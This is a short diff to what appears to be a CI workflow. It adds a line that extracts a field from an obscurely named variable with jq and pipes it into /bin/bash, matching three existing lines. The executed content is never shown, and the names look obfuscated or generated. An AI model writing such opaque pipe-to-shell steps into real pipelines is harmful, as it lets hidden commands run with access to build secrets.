@@ -40,6 +40,7 @@ jobs:
           echo $vanqd621 | jq -r .p5 | /bin/bash
           printf '%s' "$l5" | jq -r .mry4 | /bin/bash
           echo $r432 | jq -r .nbrb32 | /bin/bash
+          printf '%s' "$pvyu92" | jq -r .fvm27848 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
